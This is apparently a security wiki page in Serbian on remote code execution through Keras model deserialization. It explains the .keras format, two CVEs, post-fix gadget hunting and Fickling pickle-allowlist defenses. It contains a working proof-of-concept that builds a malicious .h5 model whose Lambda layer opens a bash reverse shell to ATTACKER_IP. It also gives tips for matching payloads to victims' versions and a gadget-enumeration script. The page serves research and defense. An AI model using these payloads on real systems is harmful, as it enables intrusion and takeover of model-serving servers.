# Keras Model Deserialization RCE i Gadget Hunting

Ova stranica sažima praktične tehnike exploitation-a protiv Keras pipeline-a za deserialization modela, objašnjava interne detalje native .keras formata i attack surface, i pruža toolkit za istraživače za pronalaženje Model File Vulnerabilities (MFVs) i post-fix gadget-a.

## Interni detalji .keras formata modela

.datoteka .keras je ZIP arhiva koja sadrži najmanje:<sup>[[1]](#references)</sup>
- metadata.json – opšte informacije (npr. Keras verzija)
- config.json – arhitektura modela (primarni attack surface)
- model.weights.h5 – weights u HDF5 formatu

config.json pokreće rekurzivni deserialization: Keras import-uje module, razrešava klase/funkcije i rekonstruiše layer-e/objekte iz dictionary-ja pod kontrolom napadača.<sup>[[1]](#references)</sup>

Primer isečka za Dense layer objekat:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization obavlja:<sup>[[1]](#references)</sup>
- Uvoz modula i razrešavanje simbola iz ključeva module/class_name
- Pozivanje from_config(...) ili konstruktora sa kwargs vrednostima pod kontrolom napadača
- Rekurziju kroz ugnježdene objekte (activations, initializers, constraints itd.)

Istorijski, ovo je napadaču koji kreira config.json pružalo tri primitive:<sup>[[1]](#references)</sup>
- Kontrolu nad tim koji se moduli uvoze
- Kontrolu nad tim koje se klase/funkcije razrešavaju
- Kontrolu nad kwargs vrednostima prosleđenim konstruktorima/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Osnovni uzrok:
- Legacy Lambda deserialization ponovo je konstruisala Python funkciju iz marshaled koda pod kontrolom napadača: `func_load()` base64-dekodira payload, poziva `marshal.loads()` i kreira `FunctionType`. Bytecode rezultujuće funkcije izvršava se kada se Lambda pozove, a loaders pogođeni problemom, pre verzije 2.13, nisu primenjivali safe-mode provere za legacy formate.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

U native Keras v3 arhivi, Lambda funkcija je predstavljena kao objekat `__lambda__`, čije polje `code` sadrži base64-enkodirani marshaled kod:<sup>[[17]](#references)[[18]](#references)</sup>
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"class_name": "__lambda__",
"config": {
"code": "<base64(marshal.dumps(function.__code__))>",
"defaults": null,
"closure": null
}
}
}
}
```
Mitigacija:
- Keras podrazumevano primenjuje `safe_mode=True` za izvorni Keras v3 format. Serijalizovani Python lambda izrazi u `Lambda` su blokirani, osim ako korisnik eksplicitno ne onemogući ovu zaštitu pomoću `safe_mode=False`; ova zaštita na isti način ne obuhvata legacy formate.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Napomene:
- Legacy formati (stariji HDF5 save fajlovi) ili starije codebase implementacije možda ne primenjuju moderne provere, pa „downgrade“ napadi i dalje mogu da funkcionišu kada žrtve koriste starije loadere.

## CVE-2025-1550 – Proizvoljni import modula u Keras 3.0.0–3.8.x

Osnovni uzrok:
- `_retrieve_class_or_fn` je koristio `importlib.import_module(module)` nad stringovima modula pod kontrolom napadača iz `config.json`.
- Uticaj: Pažljivo napravljen `.keras` arhiv mogao je da natera `Model.load_model()` da importa Python module i funkcije koje je izabrao napadač, sa sporednim efektima pri importu i argumentima pod kontrolom napadača, čak i kada je `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Ideja za exploit:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Poboljšanja bezbednosti (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Allowlist modula: uvoz je ograničen na module iz zvaničnog ekosistema: keras, keras_hub, keras_cv, keras_nlp
- Podrazumevani safe mode: safe_mode=True blokira učitavanje nesigurnih serijalizovanih Lambda funkcija
- Osnovna provera tipova: deserializovani objekti moraju odgovarati očekivanim tipovima

## Praktična eksploatacija: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Nasleđene TensorFlow-Keras implementacije možda i dalje prihvataju HDF5 fajlove modela (`.h5`). Ako napadač može da otpremi model koji server kasnije učitava ili koristi za inference, pogođeni loader može da deserijalizuje Lambda sloj koji sadrži Python pod kontrolom napadača, što zatim može da se izvrši u okviru toka rada modela aplikacije.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

Minimalni PoC za izradu zlonamernog .h5 fajla čiji Lambda izvršava reverse shell kada ciljna aplikacija pozove model:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Napomene i saveti za pouzdanost:
- Tačke aktiviranja razlikuju se u zavisnosti od formata i workflow-a; u navedenom tekstu je primećeno da se payload izvršio dva puta tokom prediction-a. Tretirajte side effects kao ponovljive i učinite payload idempotentnim.<sup>[[7]](#references)</sup>
- Fiksiranje verzija: uskladite TF/Keras/Python sa verzijama kod žrtve kako biste izbegli neusklađenosti serialization-a. Na primer, build artifacts napravite pod Python 3.8 sa TensorFlow 2.13.1, ako to koristi cilj.<sup>[[7]](#references)</sup>
- Brza replikacija okruženja:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validacija: benigni payload poput os.system("ping -c 1 YOUR_IP") pomaže da se potvrdi izvršavanje (npr. posmatranjem ICMP-a pomoću tcpdump-a) pre prelaska na reverse shell.<sup>[[7]](#references)</sup>

## Površina gadget-a unutar allowlist-e nakon ispravke

Čak i uz Keras module allowlist i safe mode, dozvoljeni callables mogu izložiti sporedne efekte. Na primer, `keras.utils.get_file` preuzima URL i upisuje ga u konfigurisanu cache lokaciju, što ga čini kandidatom za analizu gadget-a.<sup>[[1]](#references)[[19]](#references)</sup>

Kandidat za Lambda konfiguraciju (validirajte potpis poziva u kontrolisanom testu):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Važno ograničenje:
- `Lambda.call()` uvek prosleđuje ulaz modela kao prvi pozicioni argument, a konfigurisane `arguments` kao ključne argumente. Za `get_file`, ta poziciona vrednost popunjava `fname`; nepodudaranje tensor-a i putanje može dovesti do toga da ovaj kandidat ne uspe pre bilo kakvog preuzimanja, tako da nije garantovano funkcionalan gadget.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## ML pickle import allowlisting for AI/ML models (Fickling)

Mnogi AI/ML formati modela (PyTorch `.pt`/`.pth`/`.ckpt`, joblib/scikit-learn artefakti i drugi Python-native formati) sadrže Python pickle podatke. Nasleđeni Keras Lambda putanja iznad umesto toga koristi marshaled bajtkod funkcije, pa predstavlja odvojen rizik deserializacije. Pickle opcodes mogu pozvati ponašanje pod kontrolom napadača tokom deserializacije, uključujući izmenu modela ili RCE, a jednostavni skeneri mogu propustiti nove ili nenavedene opasne import-e.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Praktična fail-closed odbrana jeste presretanje Python pickle deserializer-a i dozvoljavanje samo proverenog skupa bezopasnih ML-related import-a tokom unpickling-a. Fickling kompanije Trail of Bits implementira ovu politiku i isporučuje kuriranu ML import allowlist-u napravljenu na osnovu hiljada javnih Hugging Face pickle-ova.<sup>[[8]](#references)[[13]](#references)</sup>

Security model za „bezbedne” import-e (intuicije sažete iz istraživanja i prakse): simboli koje pickle koristi moraju istovremeno:<sup>[[8]](#references)</sup>
- Ne izvršavati kod niti uzrokovati izvršavanje (bez kompajliranih/source code objekata, pokretanja shell-a, hook-ova itd.)
- Ne dobijati/postavljati proizvoljne atribute ili stavke
- Ne importovati niti dobijati reference na druge Python objekte iz pickle VM-a
- Ne pokretati sekundarne deserializer-e (npr. marshal, nested pickle), čak ni indirektno

Omogućite Fickling-ove zaštite što je ranije moguće tokom pokretanja procesa, kako bi sva pickle učitavanja koja obavljaju framework-ovi (`torch.load`, `joblib.load` itd.) bila proverena:<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Operativni saveti:
- Po potrebi možete privremeno onemogućiti/ponovo omogućiti hooks:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Ako je poznati bezbedni model blokiran, proširite allowlist za svoje okruženje nakon pregleda simbola:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling takođe pruža generičke runtime zaštite ako preferirate granularniju kontrolu:<sup>[[9]](#references)</sup>
- fickling.always_check_safety() za nametanje provera za sve pickle.load()
- with fickling.check_safety(): za primenu provera u određenom opsegu
- fickling.load(path) / fickling.is_likely_safe(path) za pojedinačne provere

- Kad god je moguće, prednost dajte formatima modela koji ne koriste pickle (npr. SafeTensors).<sup>[[15]](#references)</sup> Ako morate da prihvatite pickle, pokrenite loaders uz najmanje privilegija, bez network egress-a, i nametnite allowlist.

Ova strategija zasnovana prvenstveno na allowlist-i dokazano blokira uobičajene ML pickle exploit putanje, uz očuvanje visoke kompatibilnosti. U ToB benchmark-u, Fickling je označio 100% sintetičkih malicioznih fajlova i dozvolio približno 99% čistih fajlova iz vodećih Hugging Face repo-a.<sup>[[8]](#references)[[10]](#references)</sup>


## Istraživački alati

1) Sistematsko otkrivanje gadget-a u dozvoljenim modulima

Enumerišite potencijalne callable objekte u modulima keras, keras_nlp, keras_cv, keras_hub i dajte prednost onima koji imaju sporedne efekte nad fajlovima/network-om/process-ima/env-om.<sup>[[1]](#references)</sup>

<details>
<summary>Enumerišite potencijalno opasne callable objekte u allowlisted Keras modulima</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Direktno testiranje deserijalizacije (nije potrebna .keras arhiva)

Prosledite posebno izrađene dict objekte direktno Keras deserializatorima da biste utvrdili prihvaćene parametre i pratili sporedne efekte.<sup>[[1]](#references)</sup>
```python
import keras

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/x",
"cache_dir": "/tmp/keras-cache"
}
}
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```
3) Probinganje između verzija i formati

Keras postoji u više codebase-ova/era sa različitim zaštitnim mehanizmima i formatima:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, predviđen za uklanjanje)
- tf-keras: održava se zasebno
- Multi-backend Keras 3 (official): uveden je native .keras

Ponovite testove kroz različite codebase-ove i formate (.keras u odnosu na legacy HDF5) da biste otkrili regresije ili nedostajuće zaštitne mehanizme.

## References

- [1] [Istraživanje ranjivosti u Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Dodate provere za serialization](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Keras proizvoljni module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr report – proizvoljni import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr report – proizvoljni import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE do root-a](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits blog – novi Fickling AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Obezbeđivanje AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Pozadina Sleepy Pickle attacks](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors project](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Keras 2 Lambda Layers omogućavaju proizvoljnu code injection](https://kb.cert.org/vuls/id/253266)
- [17] [Izvorni kod Keras Lambda layer-a (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Izvorni kod Keras Python utilities (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [Keras `get_file` API](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
